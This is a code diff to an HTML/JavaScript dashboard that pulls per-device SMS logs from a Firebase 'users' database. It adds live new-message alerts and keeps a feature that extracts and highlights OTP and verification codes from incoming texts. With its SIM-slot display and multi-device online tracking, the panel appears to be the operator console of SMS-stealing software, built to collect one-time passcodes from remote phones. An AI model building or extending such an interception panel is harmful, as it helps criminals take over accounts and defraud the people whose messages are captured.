@@ -27,7 +27,6 @@
             margin: 0 auto;
         }
 
-        /* Header */
         .header {
             display: flex;
             justify-content: space-between;
@@ -101,11 +100,6 @@
             background: rgba(79, 195, 247, 0.2);
         }
 
-        .refresh-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
         .live-badge {
             font-size: 10px;
             color: #4caf50;
@@ -121,7 +115,6 @@
             50% { opacity: 0.5; }
         }
 
-        /* SIM Slots */
         .sim-slots {
             display: flex;
             gap: 4px;
@@ -159,7 +152,6 @@
             color: #556;
         }
 
-        /* Main Layout */
         .main-layout {
             display: grid;
             grid-template-columns: 1fr 380px;
@@ -172,7 +164,6 @@
             }
         }
 
-        /* Left Panel */
         .devices-panel {
             background: rgba(20, 30, 50, 0.6);
             border-radius: 10px;
@@ -380,7 +371,6 @@
             color: #4fc3f7;
         }
 
-        /* Right Panel - Inbox */
         .inbox-panel {
             background: rgba(20, 30, 50, 0.6);
             border-radius: 10px;
@@ -440,6 +430,23 @@
             animation: slideIn 0.3s ease;
         }
 
+        .inbox-message.new-message {
+            border-left-color: #4fc3f7;
+            background: rgba(79, 195, 247, 0.08);
+            animation: highlightIn 0.5s ease;
+        }
+
+        @keyframes highlightIn {
+            0% {
+                background: rgba(79, 195, 247, 0.25);
+                transform: scale(1.02);
+            }
+            100% {
+                background: rgba(79, 195, 247, 0.08);
+                transform: scale(1);
+            }
+        }
+
         .inbox-message .msg-header {
             display: flex;
             justify-content: space-between;
@@ -482,7 +489,6 @@
             padding: 30px 0;
         }
 
-        /* Loading */
         .loading {
             text-align: center;
             padding: 20px;
@@ -515,7 +521,6 @@
             }
         }
 
-        /* Toast */
         .toast {
             position: fixed;
             bottom: 20px;
@@ -541,7 +546,20 @@
             to { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
 
-        /* Responsive */
+        .notification-dot {
+            display: none;
+            width: 8px;
+            height: 8px;
+            background: #ff9800;
+            border-radius: 50%;
+            margin-left: 6px;
+            animation: pulse 1s infinite;
+        }
+
+        .notification-dot.show {
+            display: inline-block;
+        }
+
         @media (max-width: 768px) {
             body { padding: 8px; }
             .header { padding: 10px 14px; flex-direction: column; align-items: stretch; }
@@ -614,7 +632,7 @@
         <div class="inbox-panel">
             <div class="panel-header">
                 <div>
-                    <h2>📨 SMS Inbox</h2>
+                    <h2>📨 SMS Inbox <span class="notification-dot" id="newMsgDot"></span></h2>
                     <div class="device-info" id="selectedDeviceInfo">Select a device to view messages</div>
                 </div>
                 <div class="device-info" id="smsTotalCount" style="font-size:10px;color:#556;"></div>
@@ -644,6 +662,7 @@
     let currentFilter = 'all';
     let searchQuery = '';
     let isInitialLoad = true;
+    let activeListeners = {};
 
     // ===== TOAST =====
     function showToast(msg) {
@@ -739,12 +758,10 @@
 
         let userIds = Object.keys(allUsers);
 
-        // Filter
         if (currentFilter === 'online') {
             userIds = userIds.filter(id => isOnline(allUsers[id]));
         }
 
-        // Search
         if (searchQuery.trim()) {
             const query = searchQuery.trim().toLowerCase();
             userIds = userIds.filter(id => {
@@ -810,7 +827,6 @@
             grid.appendChild(card);
         });
 
-        // Auto-select first if none selected
         if (!selectedDeviceId && userIds.length > 0) {
             selectDevice(userIds[0]);
         }
@@ -821,9 +837,12 @@
         selectedDeviceId = deviceId;
         renderDevices();
         renderInbox();
+        // Clear notification dot when viewing a device
+        document.getElementById('newMsgDot').classList.remove('show');
     }
 
-    function renderInbox() {
+    // ===== RENDER INBOX WITH INSTANT UPDATE =====
+    function renderInbox(newMessageId = null) {
         const container = document.getElementById('inboxMessages');
         const info = document.getElementById('selectedDeviceInfo');
         const totalCount = document.getElementById('smsTotalCount');
@@ -849,6 +868,52 @@
             return;
         }
 
+        // If new message ID is provided, add it to the top with highlight
+        if (newMessageId) {
+            // Find the new message
+            const newSms = smsList.find(s => s.id === newMessageId);
+            if (newSms) {
+                // Add to top of list
+                const div = document.createElement('div');
+                div.className = 'inbox-message new-message';
+                const sender = newSms.sender || 'Unknown';
+                const isOTP = /otp|code|verification/i.test(newSms.message);
+                let bodyHtml = escapeHtml(newSms.message || '');
+                
+                if (isOTP) {
+                    const otpMatch = newSms.message.match(/\b\d{4,6}\b/);
+                    if (otpMatch) {
+                        bodyHtml = bodyHtml.replace(otpMatch[0], `<span class="otp-code">${otpMatch[0]}</span>`);
+                    }
+                }
+
+                div.innerHTML = `
+                    <div class="msg-header">
+                        <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
+                        <span class="msg-time">${parseTimestamp(newSms.timestamp)}</span>
+                    </div>
+                    <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
+                `;
+                
+                // Prepend to container
+                container.prepend(div);
+                
+                // Show notification dot on the header
+                document.getElementById('newMsgDot').classList.add('show');
+                
+                // Update the device card SMS count
+                updateDeviceCardSmsCount(selectedDeviceId);
+                
+                // Update total SMS count
+                updateStats();
+                
+                // Scroll to top
+                container.scrollTop = 0;
+                return;
+            }
+        }
+
+        // Full render (initial load or manual refresh)
         container.innerHTML = '';
 
         // Show notifications first
@@ -873,7 +938,6 @@
             const isOTP = /otp|code|verification/i.test(sms.message);
             let bodyHtml = escapeHtml(sms.message || '');
             
-            // Highlight OTP codes
             if (isOTP) {
                 const otpMatch = sms.message.match(/\b\d{4,6}\b/);
                 if (otpMatch) {
@@ -891,8 +955,24 @@
             container.appendChild(div);
         });
 
-        // Scroll to top
         container.scrollTop = 0;
+    }
+
+    function updateDeviceCardSmsCount(deviceId) {
+        // Find and update the device card's SMS count
+        const cards = document.querySelectorAll('.device-card');
+        cards.forEach(card => {
+            const idText = card.querySelector('.device-id')?.textContent || '';
+            if (idText.includes(deviceId.substring(0, 14))) {
+                const countSpan = card.querySelector('.sms-count');
+                if (countSpan) {
+                    const user = allUsers[deviceId];
+                    if (user) {
+                        countSpan.textContent = getSmsCount(user);
+                    }
+                }
+            }
+        });
     }
 
     function updateStats() {
@@ -923,10 +1003,8 @@
         renderDevices();
     }
 
-    // ===== MANUAL REFRESH =====
     function manualRefresh() {
         showToast('🔄 Refreshing data...');
-        // Firebase listeners are already active, just re-render
         renderDevices();
         renderInbox();
         updateStats();
@@ -937,7 +1015,7 @@
     function setupFirebaseListeners() {
         const usersRef = database.ref('users');
 
-        // Listen for all user data changes
+        // Listen for all user data changes (initial load)
         usersRef.on('value', (snapshot) => {
             const data = snapshot.val();
             if (data) {
@@ -948,29 +1026,26 @@
                 
                 if (isInitialLoad) {
                     isInitialLoad = false;
-                    // Auto-select first device
                     const ids = Object.keys(allUsers);
                     if (ids.length > 0) {
                         selectDevice(ids[0]);
                     }
                 }
-            } else {
-                allUsers = {};
-                renderDevices();
-                renderInbox();
-                updateStats();
             }
         });
 
-        // Listen for specific user changes (for instant updates)
+        // Listen for new/changed users and their SMS
         usersRef.on('child_added', (snapshot) => {
             const key = snapshot.key;
             const data = snapshot.val();
             if (key && data) {
                 allUsers[key] = data;
                 renderDevices();
-                renderInbox();
                 updateStats();
+                // If this is the selected device, update inbox
+                if (key === selectedDeviceId) {
+                    renderInbox();
+                }
             }
         });
 
@@ -978,10 +1053,38 @@
             const key = snapshot.key;
             const data = snapshot.val();
             if (key && data) {
+                const oldData = allUsers[key];
                 allUsers[key] = data;
                 renderDevices();
-                renderInbox();
                 updateStats();
+                
+                // Check if SMS was added
+                if (key === selectedDeviceId) {
+                    const oldSmsCount = oldData?.sms_logs ? Object.keys(oldData.sms_logs).length : 0;
+                    const newSmsCount = data.sms_logs ? Object.keys(data.sms_logs).length : 0;
+                    
+                    if (newSmsCount > oldSmsCount) {
+                        // Find the new message ID
+                        const oldIds = oldData?.sms_logs ? Object.keys(oldData.sms_logs) : [];
+                        const newIds = data.sms_logs ? Object.keys(data.sms_logs) : [];
+                        const newMsgId = newIds.find(id => !oldIds.includes(id));
+                        
+                        if (newMsgId) {
+                            // Show toast notification
+                            const newSms = data.sms_logs[newMsgId];
+                            if (newSms) {
+                                showToast(`📨 New SMS from ${newSms.sender || 'Unknown'}`);
+                            }
+                            // Update inbox with new message
+                            renderInbox(newMsgId);
+                        } else {
+                            renderInbox();
+                        }
+                    } else {
+                        // Just re-render
+                        renderInbox();
+                    }
+                }
             }
         });
 
